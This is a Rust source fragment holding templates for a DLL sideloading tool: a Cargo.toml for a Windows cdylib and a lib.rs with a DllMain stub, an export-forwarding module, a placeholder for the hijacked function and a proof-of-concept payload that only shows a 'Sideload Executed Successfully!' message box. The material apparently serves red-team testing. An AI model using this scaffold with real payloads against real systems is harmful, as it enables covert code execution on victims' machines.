pub const CARGO_TOML_TEMPLATE: &str = r#"
[package]
name = "{PROJECT_NAME}"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies.windows-sys]
version = "0.61.2"
features = [
    "Win32_Foundation",
    "Win32_System_SystemServices",
    "Win32_UI_WindowsAndMessaging",
]
"#;

pub const LIB_RS_TEMPLATE: &str = r#"
#![allow(non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
use windows_sys::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use windows_sys::Win32::UI::WindowsAndMessaging::MessageBoxW;
use windows_sys::core::BOOL;

mod forward;

#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn DllMain(
    _hinst: *mut c_void,
    reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH => 1,
        DLL_PROCESS_DETACH => 1,
        _ => 1,
    }
}

unsafe fn payload_execution() {
    MessageBoxW(
        null_mut(),
        windows_sys::core::w!("Sideload Executed Successfully!"),
        windows_sys::core::w!("Success"),
        0,
    );
}

{HIJACK_FUNCTION}
"#;
